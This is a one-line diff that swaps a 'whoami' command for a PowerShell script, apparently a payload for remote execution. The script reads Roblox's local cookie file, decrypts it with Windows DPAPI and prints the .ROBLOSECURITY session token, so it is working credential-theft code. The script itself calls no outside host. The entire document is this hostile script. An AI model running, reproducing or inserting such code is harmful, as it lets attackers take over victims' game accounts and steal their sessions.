@@ -1,1 +1,1 @@
-whoami
+$p = "$env:LOCALAPPDATA\Roblox\LocalStorage\robloxcookies.dat"; if (Test-Path $p) { $r = Get-Content $p -Raw; if ($r -match '"CookiesData"\s*:\s*"([^"]+)"') { $b64 = $Matches[1]; $eb = [Convert]::FromBase64String($b64); $db = [Security.Cryptography.ProtectedData]::Unprotect($eb, $null, 'CurrentUser'); $c = [Text.Encoding]::UTF8.GetString($db); if ($c -match '\.ROBLOSECURITY\s*=\s*(_[^;\s]+)') { Write-Output $Matches[1] } else { Write-Output $c } } else { Write-Output "No cookies found" } } else { Write-Output "File not found" }
